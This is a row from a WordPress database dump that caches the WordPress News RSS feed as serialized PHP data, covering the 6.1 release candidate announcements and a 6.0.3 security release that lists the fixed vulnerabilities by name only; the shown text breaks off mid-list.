(2163, '_transient_feed_9bbd59226dc36b9b26cd43f15694c5c3', 'a:4:{s:5:\"child\";a:1:{s:0:\"\";a:1:{s:3:\"rss\";a:1:{i:0;a:6:{s:4:\"data\";s:3:\"\n\n\n\";s:7:\"attribs\";a:1:{s:0:\"\";a:1:{s:7:\"version\";s:3:\"2.0\";}}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";s:5:\"child\";a:1:{s:0:\"\";a:1:{s:7:\"channel\";a:1:{i:0;a:6:{s:4:\"data\";s:112:\"\n	\n	\n	\n	\n	\n	\n	\n	\n	\n\n \n	\n		\n		\n		\n		\n		\n		\n		\n		\n		\n		\n		\n		\n		\n		\n		\n		\n		\n		\n		\n		\n		\n		\n		\n		\n		\n		\n		\n		\n		\n	\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";s:5:\"child\";a:4:{s:0:\"\";a:8:{s:5:\"title\";a:1:{i:0;a:5:{s:4:\"data\";s:14:\"WordPress News\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:4:\"link\";a:1:{i:0;a:5:{s:4:\"data\";s:26:\"https://wordpress.org/news\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:11:\"description\";a:1:{i:0;a:5:{s:4:\"data\";s:59:\"The latest news about WordPress and the WordPress community\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:13:\"lastBuildDate\";a:1:{i:0;a:5:{s:4:\"data\";s:31:\"Wed, 26 Oct 2022 15:43:59 +0000\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:8:\"language\";a:1:{i:0;a:5:{s:4:\"data\";s:5:\"en-US\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:9:\"generator\";a:1:{i:0;a:5:{s:4:\"data\";s:40:\"https://wordpress.org/?v=6.2-alpha-54706\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:5:\"image\";a:1:{i:0;a:6:{s:4:\"data\";s:11:\"\n	\n	\n	\n	\n	\n\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";s:5:\"child\";a:1:{s:0:\"\";a:5:{s:3:\"url\";a:1:{i:0;a:5:{s:4:\"data\";s:29:\"https://s.w.org/favicon.ico?2\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:5:\"title\";a:1:{i:0;a:5:{s:4:\"data\";s:14:\"WordPress News\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:4:\"link\";a:1:{i:0;a:5:{s:4:\"data\";s:26:\"https://wordpress.org/news\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:5:\"width\";a:1:{i:0;a:5:{s:4:\"data\";s:2:\"32\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:6:\"height\";a:1:{i:0;a:5:{s:4:\"data\";s:2:\"32\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}}}}s:4:\"item\";a:30:{i:0;a:6:{s:4:\"data\";s:69:\"\n		\n		\n		\n		\n		\n				\n		\n		\n		\n		\n		\n\n					\n										\n					\n		\n		\n			\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";s:5:\"child\";a:4:{s:0:\"\";a:6:{s:5:\"title\";a:1:{i:0;a:5:{s:4:\"data\";s:53:\"WordPress 6.1 Release Candidate 3 (RC3) Now Available\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:4:\"link\";a:1:{i:0;a:5:{s:4:\"data\";s:69:\"https://wordpress.org/news/2022/10/wordpress-6-1-release-candidate-3/\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:7:\"pubDate\";a:1:{i:0;a:5:{s:4:\"data\";s:31:\"Tue, 25 Oct 2022 20:29:49 +0000\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:8:\"category\";a:5:{i:0;a:5:{s:4:\"data\";s:11:\"Development\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}i:1;a:5:{s:4:\"data\";s:8:\"Releases\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}i:2;a:5:{s:4:\"data\";s:3:\"6.1\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}i:3;a:5:{s:4:\"data\";s:11:\"development\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}i:4;a:5:{s:4:\"data\";s:8:\"releases\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:4:\"guid\";a:1:{i:0;a:5:{s:4:\"data\";s:35:\"https://wordpress.org/news/?p=13670\";s:7:\"attribs\";a:1:{s:0:\"\";a:1:{s:11:\"isPermaLink\";s:5:\"false\";}}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:11:\"description\";a:1:{i:0;a:5:{s:4:\"data\";s:427:\"WordPress 6.1 Release Candidate 3 is now available for testing! You can \ndownload and help test RC3 in three ways. 6.1 is planned for general release on November 01, 2022.\n\nThis version of the WordPress software is under development. Please do not install, run, or test this version of WordPress on production or mission-critical websites. Instead, it is recommended that you test Release Candidate 3 on a test server and site.\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:32:\"http://purl.org/dc/elements/1.1/\";a:1:{s:7:\"creator\";a:1:{i:0;a:5:{s:4:\"data\";s:16:\"Jonathan Pantani\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:40:\"http://purl.org/rss/1.0/modules/content/\";a:1:{s:7:\"encoded\";a:1:{i:0;a:5:{s:4:\"data\";s:6657:\"\n<p>Release Candidate 3 (RC3) is now available for testing! The general release is just one week away with WordPress 6.1 scheduled for release on Tuesday, November 1, 2022. </p>\n\n\n\n<p>This RC3 release is the final opportunity for you to test and help to ensure the resilience of the 6.1 release by performing a final round of reviews and checks. Since the WordPress ecosystem is vast and composed of thousands of plugins and themes the entire project benefits from the time you take to assist.</p>\n\n\n\n<p><strong>This version of the WordPress software is under development</strong>. Please do not install, run, or test this version of WordPress on production or mission-critical websites. Instead, it is recommended that you test RC3 on a test server and site.&nbsp;</p>\n\n\n\n<p>You can test WordPress 6.1 RC3 in three ways:</p>\n\n\n\n<p><strong>Option 1: </strong>Install and activate the <a href=\"https://wordpress.org/plugins/wordpress-beta-tester/\">WordPress Beta Tester</a> plugin (select the “Bleeding edge” channel and “Beta/RC Only” stream).</p>\n\n\n\n<p><strong>Option 2: </strong>Direct download the <a href=\"https://wordpress.org/wordpress-6.1-RC3.zip\">RC3 version (zip)</a>.</p>\n\n\n\n<p><strong>Option 3:</strong> Use the WP-CLI command:</p>\n\n\n\n<p><code>wp core update --version=6.1-RC3</code></p>\n\n\n\n<p>Additional information on the <a href=\"https://make.wordpress.org/core/6-1/\">6.1 release cycle is available here</a>.</p>\n\n\n\n<p>Check the <a href=\"https://make.wordpress.org/core/\">Make WordPress Core blog</a> for <a href=\"https://make.wordpress.org/core/tag/dev-notes+6-1/\">6.1-related developer notes</a> in the coming weeks detailing all upcoming changes.</p>\n\n\n\n<h2><strong>What’s in WordPress 6.1 RC3?</strong></h2>\n\n\n\n<p>Since Release Candidate 2, approximately 60 items have been addressed. </p>\n\n\n\n<ul>\n<li><a href=\"https://github.com/WordPress/gutenberg/commits/wp/6.1\">GitHub tickets</a></li>\n\n\n\n<li><a href=\"https://core.trac.wordpress.org/query?status=accepted&amp;status=closed&amp;changetime=10%2F18%2F2022..10%2F25%2F2022&amp;resolution=fixed&amp;milestone=6.1&amp;col=id&amp;col=summary&amp;col=status&amp;col=milestone&amp;col=owner&amp;col=type&amp;col=priority&amp;order=id\">Trac tickets</a> </li>\n</ul>\n\n\n\n<p>WordPress 6.1 is the third major release for 2022, following 5.9 and 6.0, released in January and May of this year, respectively.</p>\n\n\n\n<p>To learn more about the highlights for both end-users and developers, you’re invited to read more about them in the <a href=\"https://wordpress.org/news/2022/10/wordpress-6-1-release-candidate-1-rc1-now-available/\">RC1 announcement post</a> and review the <a href=\"https://make.wordpress.org/core/2022/10/12/wordpress-6-1-field-guide/\">WordPress 6.1 Field Guide</a>.</p>\n\n\n\n<h2><strong>Plugin and theme developers</strong></h2>\n\n\n\n<p>All plugin and theme developers should test their respective extensions against WordPress 6.1 RC3 and update the “<em>Tested up to”</em> version in their readme file to 6.1. If you find compatibility problems, please post detailed information to the <a href=\"https://wordpress.org/support/forum/alphabeta/\">support forums</a>, so these items can be investigated further prior to the final release date of November 1st.</p>\n\n\n\n<h2><strong>Translate WordPress</strong></h2>\n\n\n\n<p>Do you speak a language other than English? <a href=\"https://translate.wordpress.org/projects/wp/dev\">Help translate WordPress into more than 100 languages.</a>&nbsp;</p>\n\n\n\n<p><strong>Keep WordPress bug-free – help with testing</strong></p>\n\n\n\n<p>Testing for issues is critical for stabilizing a release throughout its development. Testing is also a great way to contribute. <a href=\"https://make.wordpress.org/test/2022/09/21/help-test-wordpress-6-1/\">This detailed guide</a> is an excellent start if you have never tested a beta release.</p>\n\n\n\n<p>Testing helps ensure that this and future releases of WordPress are as stable and issue-free as possible. Anyone can take part in testing – regardless of prior experience.</p>\n\n\n\n<p>Want to know more about testing releases like this one? Read about the <a href=\"https://make.wordpress.org/test/\">testing initiatives</a> that happen in Make Core. You can also join a <a href=\"https://wordpress.slack.com/messages/core-test/\">core-test channel</a> on the <a href=\"https://wordpress.slack.com/\">Making WordPress Slack workspace</a>.</p>\n\n\n\n<p>If you have run into an issue, please report it to the <a href=\"https://wordpress.org/support/forum/alphabeta/\">Alpha/Beta area</a> in the support forums. If you are comfortable writing a reproducible bug report, you can <a href=\"https://core.trac.wordpress.org/newticket\">file one on WordPress Trac</a>. This is also where you can find a list of <a href=\"https://core.trac.wordpress.org/tickets/major\">known bugs</a>.</p>\n\n\n\n<p>To review features in the Gutenberg releases since WordPress 6.0 (the most recent major release of WordPress), access the <em>What’s New In Gutenberg</em> posts for <a href=\"https://make.wordpress.org/core/2022/09/16/whats-new-in-gutenberg-14-1-15-september/\">14.1</a>, <a href=\"https://make.wordpress.org/core/2022/09/01/whats-new-in-gutenberg-14-0-31-august/\">14.0</a>, <a href=\"https://make.wordpress.org/core/2022/08/17/whats-new-in-gutenberg-13-9-17-august/\">13.9</a>, <a href=\"https://make.wordpress.org/core/2022/08/04/whats-new-in-gutenberg-13-8-3-august/\">13.8</a>, <a href=\"https://make.wordpress.org/core/2022/07/20/whats-new-in-gutenberg-13-7-20-july/\">13.7</a>, <a href=\"https://make.wordpress.org/core/2022/07/07/whats-new-in-gutenberg-13-6-6-july/\">13.6</a>, <a href=\"https://make.wordpress.org/core/2022/06/22/whats-new-in-gutenberg-13-5-22-june/\">13.5</a>, <a href=\"https://make.wordpress.org/core/2022/06/10/whats-new-in-gutenberg-13-4-8-june/\">13.4</a>, <a href=\"https://make.wordpress.org/core/2022/05/26/whats-new-in-gutenberg-13-3-0-may-25/\">13.3</a>, <a href=\"https://make.wordpress.org/core/2022/05/12/whats-new-in-gutenberg-13-2-may-11/\">13.2</a>, and <a href=\"https://make.wordpress.org/core/2022/04/28/whats-new-in-gutenberg-13-1-27-april/\">13.1</a>.</p>\n\n\n\n<hr class=\"wp-block-separator has-alpha-channel-opacity\" />\n\n\n\n<h2>RC3, A Penultimate Haiku</h2>\n\n\n\n<p><em>The time ticks forward<br>Release nears ever closer<br>Download and review</em></p>\n\n\n\n<hr class=\"wp-block-separator has-alpha-channel-opacity\" />\n\n\n\n<p>Props to the following contributors for collaborating on this post: <a href=\"https://profiles.wordpress.org/dansoschin/\">Dan Soschin</a>, <a href=\"https://wordpress.org/support/users/spacedmonkey/\">Jonny Harris</a></p>\n\n\n\n<hr class=\"wp-block-separator has-alpha-channel-opacity\" />\n\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:30:\"com-wordpress:feed-additions:1\";a:1:{s:7:\"post-id\";a:1:{i:0;a:5:{s:4:\"data\";s:5:\"13670\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}}}i:1;a:6:{s:4:\"data\";s:69:\"\n		\n		\n		\n		\n		\n				\n		\n		\n		\n		\n		\n\n					\n										\n					\n		\n		\n			\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";s:5:\"child\";a:4:{s:0:\"\";a:6:{s:5:\"title\";a:1:{i:0;a:5:{s:4:\"data\";s:53:\"WordPress 6.1 Release Candidate 2 (RC2) Now Available\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:4:\"link\";a:1:{i:0;a:5:{s:4:\"data\";s:83:\"https://wordpress.org/news/2022/10/wordpress-6-1-release-candidate-2-now-available/\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:7:\"pubDate\";a:1:{i:0;a:5:{s:4:\"data\";s:31:\"Tue, 18 Oct 2022 19:31:20 +0000\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:8:\"category\";a:5:{i:0;a:5:{s:4:\"data\";s:11:\"Development\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}i:1;a:5:{s:4:\"data\";s:8:\"Releases\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}i:2;a:5:{s:4:\"data\";s:3:\"6.1\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}i:3;a:5:{s:4:\"data\";s:11:\"development\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}i:4;a:5:{s:4:\"data\";s:8:\"releases\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:4:\"guid\";a:1:{i:0;a:5:{s:4:\"data\";s:35:\"https://wordpress.org/news/?p=13646\";s:7:\"attribs\";a:1:{s:0:\"\";a:1:{s:11:\"isPermaLink\";s:5:\"false\";}}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:11:\"description\";a:1:{i:0;a:5:{s:4:\"data\";s:332:\"WordPress 6.1 Release Candidate 2 is now available for download and testing.\n\nThis version of the WordPress software is under development. Please do not install, run, or test this version of WordPress on production or mission-critical websites. Instead, it is recommended that you test Release Candidate 2 on a test server and site.\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:32:\"http://purl.org/dc/elements/1.1/\";a:1:{s:7:\"creator\";a:1:{i:0;a:5:{s:4:\"data\";s:16:\"Jonathan Pantani\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:40:\"http://purl.org/rss/1.0/modules/content/\";a:1:{s:7:\"encoded\";a:1:{i:0;a:5:{s:4:\"data\";s:7012:\"\n<hr class=\"wp-block-separator has-alpha-channel-opacity\" />\n\n\n\n<p>The second release candidate (RC2) for WordPress 6.1 is now available!</p>\n\n\n\n<hr class=\"wp-block-separator has-alpha-channel-opacity\" />\n\n\n\n<p>“Release Candidate” means that this version of WordPress is ready for release and it is a key milestone in the 6.1 release cycle! Before the official release date, the community sets aside time to perform final reviews and help test. Since the WordPress ecosystem includes thousands of plugins and themes, it is important that everyone checks to see if anything has been missed along the way. That means the project would <em>greatly benefit from</em> your assistance.</p>\n\n\n\n<p>WordPress 6.1 is planned for official release on November 1st, 2022, two weeks from today.&nbsp;</p>\n\n\n\n<p><strong>This version of the WordPress software is under development</strong>. Please do not install, run, or test this version of WordPress on production or mission-critical websites. Instead, it is recommended that you test RC2 on a test server and site.&nbsp;</p>\n\n\n\n<p>You can test WordPress 6.1 RC2 in three ways:</p>\n\n\n\n<p><strong>Option 1: </strong>Install and activate the <a href=\"https://wordpress.org/plugins/wordpress-beta-tester/\">WordPress Beta Tester</a> plugin (select the “Bleeding edge” channel and “Beta/RC Only” stream).</p>\n\n\n\n<p><strong>Option 2: </strong>Direct download the <a href=\"https://wordpress.org/wordpress-6.1-RC2.zip\">RC2 version (zip)</a>.</p>\n\n\n\n<p><strong>Option 3:</strong> Use the WP-CLI command:</p>\n\n\n\n<p><code>wp core update --version=6.1-RC2</code></p>\n\n\n\n<p>Additional information on the <a href=\"https://make.wordpress.org/core/6-1/\">6.1 release cycle is available here</a>.</p>\n\n\n\n<p>Check the <a href=\"https://make.wordpress.org/core/\">Make WordPress Core blog</a> for <a href=\"https://make.wordpress.org/core/tag/dev-notes+6-1/\">6.1-related developer notes</a> in the coming weeks detailing all upcoming changes.</p>\n\n\n\n<h2><strong>What’s in WordPress 6.1 RC2?</strong></h2>\n\n\n\n<p>Since Release Candidate 1, approximately 65 items have been addressed, bringing the total count to more than 2,000 updates since WordPress 6.0 in May of 2022.&nbsp;</p>\n\n\n\n<ul>\n<li><a href=\"https://github.com/WordPress/gutenberg/commits/wp/6.1\">GitHub tickets</a></li>\n\n\n\n<li><a href=\"https://core.trac.wordpress.org/query?status=accepted&amp;status=closed&amp;changetime=10%2F11%2F2022..10%2F18%2F2022&amp;resolution=fixed&amp;milestone=6.1&amp;col=id&amp;col=summary&amp;col=status&amp;col=milestone&amp;col=owner&amp;col=type&amp;col=priority&amp;order=id\">Trac tickets</a>&nbsp;</li>\n</ul>\n\n\n\n<p>WordPress 6.1 is the third major release for 2022, following 5.9 and 6.0, released in January and May of this year, respectively.</p>\n\n\n\n<p>To learn more about the highlights for both end-users and developers, you’re invited to read more about them in the <a href=\"https://wordpress.org/news/2022/10/wordpress-6-1-release-candidate-1-rc1-now-available/\">RC1 announcement post</a> and review the <a href=\"https://make.wordpress.org/core/2022/10/12/wordpress-6-1-field-guide/\">WordPress 6.1 Field Guide</a>.</p>\n\n\n\n<h2><strong>Plugin and theme developers</strong></h2>\n\n\n\n<p>All plugin and theme developers should test their respective extensions against WordPress 6.1 RC2 and update the “<em>Tested up to”</em> version in their readme file to 6.1. If you find compatibility problems, please post detailed information to the <a href=\"https://wordpress.org/support/forum/alphabeta/\">support forums</a>, so these items can be investigated further prior to the final release date of November 1st.</p>\n\n\n\n<h2><strong>Translate WordPress</strong></h2>\n\n\n\n<p>Do you speak a language other than English? <a href=\"https://translate.wordpress.org/projects/wp/dev\">Help translate WordPress into more than 100 languages.</a>&nbsp;</p>\n\n\n\n<p><strong>Keep WordPress bug-free – help with testing</strong></p>\n\n\n\n<p>Testing for issues is critical for stabilizing a release throughout its development. Testing is also a great way to contribute. <a href=\"https://make.wordpress.org/test/2022/09/21/help-test-wordpress-6-1/\">This detailed guide</a> is an excellent start if you have never tested a beta release.</p>\n\n\n\n<p>Testing helps ensure that this and future releases of WordPress are as stable and issue-free as possible. Anyone can take part in testing – regardless of prior experience.</p>\n\n\n\n<p>Want to know more about testing releases like this one? Read about the <a href=\"https://make.wordpress.org/test/\">testing initiatives</a> that happen in Make Core. You can also join a <a href=\"https://wordpress.slack.com/messages/core-test/\">core-test channel</a> on the <a href=\"https://wordpress.slack.com/\">Making WordPress Slack workspace</a>.</p>\n\n\n\n<p>If you have run into an issue, please report it to the <a href=\"https://wordpress.org/support/forum/alphabeta/\">Alpha/Beta area</a> in the support forums. If you are comfortable writing a reproducible bug report, you can <a href=\"https://core.trac.wordpress.org/newticket\">file one on WordPress Trac</a>. This is also where you can find a list of <a href=\"https://core.trac.wordpress.org/tickets/major\">known bugs</a>.</p>\n\n\n\n<p>To review features in the Gutenberg releases since WordPress 6.0 (the most recent major release of WordPress), access the <em>What’s New In Gutenberg</em> posts for <a href=\"https://make.wordpress.org/core/2022/09/16/whats-new-in-gutenberg-14-1-15-september/\">14.1</a>, <a href=\"https://make.wordpress.org/core/2022/09/01/whats-new-in-gutenberg-14-0-31-august/\">14.0</a>, <a href=\"https://make.wordpress.org/core/2022/08/17/whats-new-in-gutenberg-13-9-17-august/\">13.9</a>, <a href=\"https://make.wordpress.org/core/2022/08/04/whats-new-in-gutenberg-13-8-3-august/\">13.8</a>, <a href=\"https://make.wordpress.org/core/2022/07/20/whats-new-in-gutenberg-13-7-20-july/\">13.7</a>, <a href=\"https://make.wordpress.org/core/2022/07/07/whats-new-in-gutenberg-13-6-6-july/\">13.6</a>, <a href=\"https://make.wordpress.org/core/2022/06/22/whats-new-in-gutenberg-13-5-22-june/\">13.5</a>, <a href=\"https://make.wordpress.org/core/2022/06/10/whats-new-in-gutenberg-13-4-8-june/\">13.4</a>, <a href=\"https://make.wordpress.org/core/2022/05/26/whats-new-in-gutenberg-13-3-0-may-25/\">13.3</a>, <a href=\"https://make.wordpress.org/core/2022/05/12/whats-new-in-gutenberg-13-2-may-11/\">13.2</a>, and <a href=\"https://make.wordpress.org/core/2022/04/28/whats-new-in-gutenberg-13-1-27-april/\">13.1</a>.</p>\n\n\n\n<hr class=\"wp-block-separator has-alpha-channel-opacity\" />\n\n\n\n<h2><strong>Haiku Fun for RC2</strong></h2>\n\n\n\n<p><em>Two weeks from the launch </em><br><em>Constant improvements we make </em><br><em>Great outcomes await </em></p>\n\n\n\n<hr class=\"wp-block-separator has-alpha-channel-opacity\" />\n\n\n\n<p><em>Update Oct 25 12:45 UTC: This post has been updated to remove the reference to Gutenberg versions 14.3 and 14.2 being included in the 6.1 release. They will be included in a future release.</em></p>\n\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:30:\"com-wordpress:feed-additions:1\";a:1:{s:7:\"post-id\";a:1:{i:0;a:5:{s:4:\"data\";s:5:\"13646\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}}}i:2;a:6:{s:4:\"data\";s:60:\"\n		\n		\n		\n		\n		\n				\n		\n		\n\n					\n										\n					\n		\n		\n			\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";s:5:\"child\";a:4:{s:0:\"\";a:6:{s:5:\"title\";a:1:{i:0;a:5:{s:4:\"data\";s:32:\"WordPress 6.0.3 Security Release\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:4:\"link\";a:1:{i:0;a:5:{s:4:\"data\";s:68:\"https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:7:\"pubDate\";a:1:{i:0;a:5:{s:4:\"data\";s:31:\"Mon, 17 Oct 2022 22:55:55 +0000\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:8:\"category\";a:2:{i:0;a:5:{s:4:\"data\";s:8:\"Releases\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}i:1;a:5:{s:4:\"data\";s:8:\"Security\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:4:\"guid\";a:1:{i:0;a:5:{s:4:\"data\";s:35:\"https://wordpress.org/news/?p=13618\";s:7:\"attribs\";a:1:{s:0:\"\";a:1:{s:11:\"isPermaLink\";s:5:\"false\";}}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:11:\"description\";a:1:{i:0;a:5:{s:4:\"data\";s:358:\"WordPress 6.0.3 is now available! This release features several security fixes. Because this is a security release, it is recommended that you update your sites immediately. All versions since WordPress 3.7 have also been updated. WordPress 6.0.3 is a short-cycle release. The next major release will be version 6.1 planned for November 1, 2022. If [&#8230;]\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:32:\"http://purl.org/dc/elements/1.1/\";a:1:{s:7:\"creator\";a:1:{i:0;a:5:{s:4:\"data\";s:9:\"Jb Audras\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:40:\"http://purl.org/rss/1.0/modules/content/\";a:1:{s:7:\"encoded\";a:1:{i:0;a:5:{s:4:\"data\";s:6151:\"\n<p><strong>WordPress 6.0.3</strong> is now available!</p>\n\n\n\n<p>This release features several security fixes. Because this is a <strong>security release</strong>, it is recommended that you update your sites immediately. All versions since WordPress 3.7 have also been updated.</p>\n\n\n\n<p>WordPress 6.0.3 is a short-cycle release. The next major release will be <a href=\"https://make.wordpress.org/core/6-1/\">version 6.1</a> planned for November 1, 2022.</p>\n\n\n\n<p>If you have sites that support automatic background updates, the update process will begin automatically.</p>\n\n\n\n<p>You can <a href=\"https://wordpress.org/wordpress-6.0.3.zip\">download WordPress 6.0.3 from WordPress.org</a>, or visit your WordPress Dashboard, click “Updates”, and then click “Update Now”.</p>\n\n\n\n<p>For more information on this release, please <a href=\"https://wordpress.org/support/wordpress-version/version-6-0-3\">visit the HelpHub site</a>.</p>\n\n\n\n<h2>Security updates included in this release</h2>\n\n\n\n<p>The security team would like to thank the following people for responsibly reporting vulnerabilities, and allowing them to be fixed in this release.</p>\n\n\n\n<ul>\n<li>Stored XSS via wp-mail.php (post by email) &#8211; Toshitsugu Yoneyama of Mitsui Bussan Secure Directions, Inc. via JPCERT</li>\n\n\n\n<li>Open redirect in `wp_nonce_ays` &#8211; <a href=\"https://hackerone.com/devrayn\">devrayn</a></li>\n\n\n\n<li>Sender&#8217;s email address is exposed in wp-mail.php &#8211; Toshitsugu Yoneyama of Mitsui Bussan Secure Directions, Inc. via JPCERT</li>\n\n\n\n<li>Media Library &#8211; Reflected XSS via SQLi &#8211; Ben Bidner from the WordPress security team and Marc Montpas from Automattic independently discovered this issue</li>\n\n\n\n<li>CSRF in wp-trackback.php &#8211; Simon Scannell</li>\n\n\n\n<li>Stored XSS via the Customizer &#8211; Alex Concha from the WordPress security team</li>\n\n\n\n<li>Revert shared user instances introduced in <a href=\"https://core.trac.wordpress.org/changeset/50790\">50790</a> &#8211; 